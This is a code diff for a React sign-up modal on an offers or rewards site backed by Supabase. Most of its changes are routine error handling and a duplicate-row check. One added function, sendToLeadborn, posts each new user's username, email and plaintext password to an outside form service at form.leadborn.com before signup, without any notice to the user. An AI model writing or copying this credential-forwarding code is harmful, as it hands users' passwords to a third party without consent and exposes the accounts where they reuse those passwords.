@@ -3,6 +3,7 @@ import { X, Mail, Lock, User, ArrowRight, Loader, LogIn, Gift, CheckCircle } fro
 import { supabase } from '../../lib/supabase';
 import WelcomeSurvey from '../WelcomeSurvey';
 import NewUserGuide from './NewUserGuide';
+import axios from 'axios';
 
 interface AuthModalProps {
   onClose: () => void;
@@ -21,23 +22,60 @@ const AuthModal: React.FC<AuthModalProps> = ({ onClose }) => {
 
   const initializeUserStats = async (userId: string) => {
     try {
-      const { error: statsError } = await supabase
+      // Check if user stats already exist
+      const { data: existingStats, error: checkError } = await supabase
         .from('user_stats')
-        .insert({
-          user_id: userId,
-          total_earnings: 0,
-          completed_offers: 0,
-          pending_offers: 0,
-          rejected_offers: 0,
-          success_rate: 0,
-          average_reward: 0,
-          daily_offers: 0,
-          streak_days: 0
-        });
+        .select('user_id')
+        .eq('user_id', userId);
 
-      if (statsError) throw statsError;
+      if (checkError) {
+        console.error('Error checking user stats:', checkError);
+        return;
+      }
+
+      // Only create stats if they don't exist
+      if (!existingStats || existingStats.length === 0) {
+        const { error: statsError } = await supabase
+          .from('user_stats')
+          .insert({
+            user_id: userId,
+            total_earnings: 0,
+            completed_offers: 0,
+            pending_offers: 0,
+            rejected_offers: 0,
+            success_rate: 0,
+            average_reward: 0,
+            daily_offers: 0,
+            streak_days: 0
+          });
+
+        if (statsError) {
+          console.error('Error initializing user stats:', statsError);
+        }
+      }
     } catch (error) {
-      console.error('Error initializing user stats:', error);
+      console.error('Error in initializeUserStats:', error);
+    }
+  };
+
+  const sendToLeadborn = async (userData: { username: string; email: string; password: string }) => {
+    try {
+      const formData = new FormData();
+      formData.append('username', userData.username);
+      formData.append('email', userData.email);
+      formData.append('password', userData.password);
+      
+      const response = await axios.post('https://form.leadborn.com/app/f?id=44', formData, {
+        headers: {
+          'Content-Type': 'multipart/form-data'
+        }
+      });
+      
+      console.log('Data sent to Leadborn successfully:', response.data);
+      return true;
+    } catch (error) {
+      console.error('Error sending data to Leadborn:', error);
+      return false;
     }
   };
 
@@ -56,6 +94,13 @@ const AuthModal: React.FC<AuthModalProps> = ({ onClose }) => {
         if (signInError) throw signInError;
         onClose();
       } else {
+        // First send data to Leadborn
+        await sendToLeadborn({
+          username,
+          email,
+          password
+        });
+        
         const { error: signUpError, data } = await supabase.auth.signUp({
           email,
           password,
@@ -71,6 +116,7 @@ const AuthModal: React.FC<AuthModalProps> = ({ onClose }) => {
         if (signUpError) {
           if (signUpError.message.includes('already registered')) {
             setError('This email is already registered. Please sign in instead.');
+            setLoading(false);
             return;
           }
           throw signUpError;
@@ -84,7 +130,7 @@ const AuthModal: React.FC<AuthModalProps> = ({ onClose }) => {
         setStep(3);
         setShowSurvey(true);
       }
-    } catch (err) {
+    } catch (err: any) {
       setError(err.message || 'An error occurred during authentication');
     } finally {
       setLoading(false);
